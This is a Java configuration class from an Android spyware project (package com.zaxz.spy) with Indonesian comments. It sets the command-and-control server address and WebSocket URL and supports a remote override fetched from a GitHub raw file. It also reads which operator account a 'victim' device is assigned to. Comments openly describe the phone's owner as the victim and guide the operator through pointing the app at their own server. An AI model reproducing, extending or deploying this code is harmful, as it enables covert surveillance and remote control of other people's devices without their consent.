package com.zaxz.spy;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class Config {
    private static final String TAG = "SpyConfig";

    // ============================================================
    // ============ KONFIGURASI SERVER — EDIT DI SINI ============
    // ============================================================
    //
    // Ganti IP/hostname berikut dengan alamat server API kamu.
    // Contoh:
    //   - "192.168.1.10:3000"        (jika server di LAN)
    //   - "yourdomain.com"           (jika pakai domain)
    //   - "203.0.113.5:3000"         (VPS dengan port)
    //
    // JANGAN pakai 127.0.0.1 / localhost — itu akan connect ke
    // device victim SENDIRI, bukan ke server API kamu.
    //
    public static final String SERVER_HOST = "127.0.0.1:3000";

    // URL utama — otomatis dibangun dari SERVER_HOST di atas.
    public static String API_URL = "http://" + SERVER_HOST;
    public static String WS_URL  = "ws://"   + SERVER_HOST;

    // ============================================================
    // ============ OPTIONAL: REMOTE CONFIG (GITHUB) =============
    // ============================================================
    // Kalau kamu mau bisa override SERVER_HOST dari GitHub,
    // isi URL raw file di sini. Format file (raw JSON):
    //   { "api_url": "http://1.2.3.4:3000", "ws_url": "ws://1.2.3.4:3000" }
    //
    // Pakai raw.githubusercontent.com (BUKAN api.github.com/repos/.../contents/...)
    // karena Contents API membungkus konten dengan base64.
    //
    // Kosongkan string untuk menonaktifkan remote config.
    private static final String GITHUB_RAW_URL = "";
    private static final String GITHUB_TOKEN   = "";

    private static volatile boolean initialized = false;

    // ============================================================
    // ============ PUBLIC API ============
    // ============================================================

    /**
     * Load config secara BLOCKING. Aman dipanggil dari background thread.
     * Karena BackgroundService.onStartCommand sudah jalan di main thread,
     * kita spawn worker thread dan tunggu dengan CountDownLatch (timeout 5s).
     */
    public static void loadConfig(Context context) {
        // synchronized supaya gak ada double-fetch race antara MainActivity & BackgroundService
        synchronized (Config.class) {
            if (initialized) return;

            final CountDownLatch latch = new CountDownLatch(1);
            final SharedPreferences prefs = context.getSharedPreferences("spy_config", Context.MODE_PRIVATE);

            // 1) Segera pakai cache dulu (kalau ada) supaya URL gak blank saat service start
            String cachedApi = prefs.getString("api_url", null);
            String cachedWs  = prefs.getString("ws_url", null);
            if (cachedApi != null && !cachedApi.isEmpty()) API_URL = cachedApi;
            if (cachedWs  != null && !cachedWs.isEmpty())  WS_URL  = cachedWs;

            // 2) Kalau GITHUB_RAW_URL kosong, skip remote fetch
            if (GITHUB_RAW_URL == null || GITHUB_RAW_URL.isEmpty()) {
                Log.i(TAG, "Remote config disabled. Using: API_URL=" + API_URL + " WS_URL=" + WS_URL);
                initialized = true;
                return;
            }

            // 3) Fetch remote config di thread terpisah, blocking tunggu max 5 detik
            new Thread(new Runnable() {
                @Override
                public void run() {
                    HttpURLConnection conn = null;
                    try {
                        URL url = new URL(GITHUB_RAW_URL);
                        conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        if (GITHUB_TOKEN != null && !GITHUB_TOKEN.isEmpty()) {
                            conn.setRequestProperty("Authorization", "token " + GITHUB_TOKEN);
                        }
                        conn.setRequestProperty("Accept", "application/vnd.github.v3.raw");
                        conn.setConnectTimeout(4000);
                        conn.setReadTimeout(4000);

                        int responseCode = conn.getResponseCode();
                        if (responseCode == 200) {
                            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                            StringBuilder response = new StringBuilder();
                            String line;
                            while ((line = reader.readLine()) != null) {
                                response.append(line);
                            }
                            reader.close();

                            JSONObject config = new JSONObject(response.toString());
                            if (config.has("api_url")) {
                                API_URL = config.getString("api_url");
                            }
                            if (config.has("ws_url")) {
                                WS_URL = config.getString("ws_url");
                            }

                            prefs.edit()
                                .putString("api_url", API_URL)
                                .putString("ws_url", WS_URL)
                                .apply();

                            Log.i(TAG, "Remote config loaded: API_URL=" + API_URL + " WS_URL=" + WS_URL);
                        } else {
                            // BUG LAMA: 404/4xx/5xx bukan exception, jadi gak masuk catch.
                            // Sekarang fallback ke cache (yang sudah diset di atas).
                            Log.w(TAG, "Remote config HTTP " + responseCode + ", using cached/default: API_URL=" + API_URL + " WS_URL=" + WS_URL);
                        }
                    } catch (Exception e) {
                        Log.w(TAG, "Remote config fetch failed: " + e.getMessage() + ". Using: API_URL=" + API_URL + " WS_URL=" + WS_URL);
                    } finally {
                        if (conn != null) try { conn.disconnect(); } catch (Exception ignored) {}
                        initialized = true;
                        latch.countDown();
                    }
                }
            }).start();

            try {
                latch.await(5, TimeUnit.SECONDS);
            } catch (InterruptedException ignored) {}
            // Kalau timeout, thread tetap jalan di background; initialized akan diset true di finally.
        }
    }

    /**
     * Baca username victim dari file asset "@AiiSigma".
     * Isi file = username admin yang akan menerima device ini.
     */
    public static String getUsername(Context context) {
        try {
            InputStream is = context.getAssets().open("@AiiSigma");
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            String username = reader.readLine();
            reader.close();
            is.close();
            return username != null ? username.trim() : "default";
        } catch (Exception e) {
            Log.w(TAG, "Failed to read @AiiSigma asset, using default username", e);
            return "default";
        }
    }
}
